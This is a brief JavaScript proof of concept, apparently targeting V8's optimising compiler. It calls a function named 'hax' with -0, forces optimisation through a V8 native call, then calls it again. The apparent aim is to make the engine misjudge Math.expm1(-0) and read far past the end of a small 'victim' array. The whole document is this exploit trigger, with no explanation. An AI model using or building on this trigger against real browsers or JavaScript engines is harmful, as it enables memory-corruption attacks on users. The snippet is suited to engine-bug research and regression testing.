	
	
	function hax(x, y) {
		var victim = [0.1, 0.2, 0.3, 0.4];
		var a = Object.is(Math.expm1(x), y);
		return victim[a * 1234];
	}

	console.log(hax(-0));
	%OptimizeFunctionOnNextCall(hax);
	console.log(hax(-0));
